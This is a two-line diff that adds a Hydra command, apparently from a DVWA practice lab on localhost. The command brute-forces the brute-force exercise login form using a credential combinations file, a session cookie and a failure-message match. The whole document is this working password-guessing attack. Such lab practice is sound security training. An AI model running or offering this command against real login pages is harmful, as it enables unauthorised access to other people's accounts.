@@ -1,0 +1,2 @@
+hydra -C /home/kali/Documents/combinaciones.txt \
+'http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low;PHPSESSID=8bf6c05ef485d4bcaae25dd50977b0ea:F=Username and/or password incorrect'
